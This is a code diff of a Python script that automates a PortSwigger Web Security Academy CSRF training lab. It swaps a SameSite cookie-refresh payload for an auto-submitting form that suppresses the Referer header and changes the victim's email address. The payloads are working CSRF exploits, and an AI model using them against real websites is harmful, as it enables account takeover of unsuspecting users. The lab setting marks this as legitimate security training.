@@ -2,23 +2,19 @@ import requests
 from urllib3.exceptions import InsecureRequestWarning
 from time import sleep
 from bs4 import BeautifulSoup
-from string import Template
-
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-# lab_url: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
+# lab_url: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
 # author: 0xyf
 
 
-class CSRF10:
+class CSRF11:
     def __init__(self):
-        self.lab_id = "0a4d00ac030fb2fc808dd5b4007f0047"
+        self.lab_id = "0ae300e5048db1218459729d00e600d6"
         self.proxies = {"https": "http://127.0.0.1:8080"}
 
         self.url = f"https://{self.lab_id}.web-security-academy.net"
-        self.sso_login_url = f"{self.url}/social-login"
-        self.chg_email_url = f"{self.url}/my-account/change-email"
 
     def get_exploit_srv_url(self):
         r = requests.get(self.url)
@@ -36,27 +32,17 @@ class CSRF10:
 
     def csrf(self):
         self.get_exploit_srv_url()
-        payload = Template(
-            """<form method="POST" action="$chg_email_url">
-            <input type="hidden" name="email" value="0xyf@0xyf.local">
+        payload = f"""<html>
+        <head>
+            <meta name="referrer" content="no-referrer">
+        </head>
+        <form method="POST" action="{self.url}/my-account/change-email">
+            <input type="hidden" name="email" value="0xyf2@0xyf.local">
             </form>
-            <p>Click anywhere on the page</p>
-            <script>
-                window.onclick = () => {
-                    window.open('$sso_login_url');
-                    setTimeout(changeEmail, 5000);
-                }
-
-                function changeEmail() {
-                    document.forms[0].submit();
-                }
-                </script>"""
-        )
-
-        payload = payload.substitute(
-            chg_email_url=self.chg_email_url,
-            sso_login_url=self.sso_login_url,
-        )
+        <script>
+            document.forms[0].submit();
+        </script>
+        </html>"""
         data = {
             "urlIsHttps": "on",
             "responseFile": "/exploit",
@@ -67,7 +53,7 @@ class CSRF10:
         r = self.execute_request(data)
 
     def check_solved(self):
-        sleep(5)
+        sleep(2)
         r = requests.get(self.url)
         if "Congratulations, you solved the lab!" in r.text:
             print("Lab Solved")
@@ -80,7 +66,7 @@ class CSRF10:
 
 
 def main():
-    CSRF10().solve()
+    CSRF11().solve()
 
 
 if __name__ == "__main__":
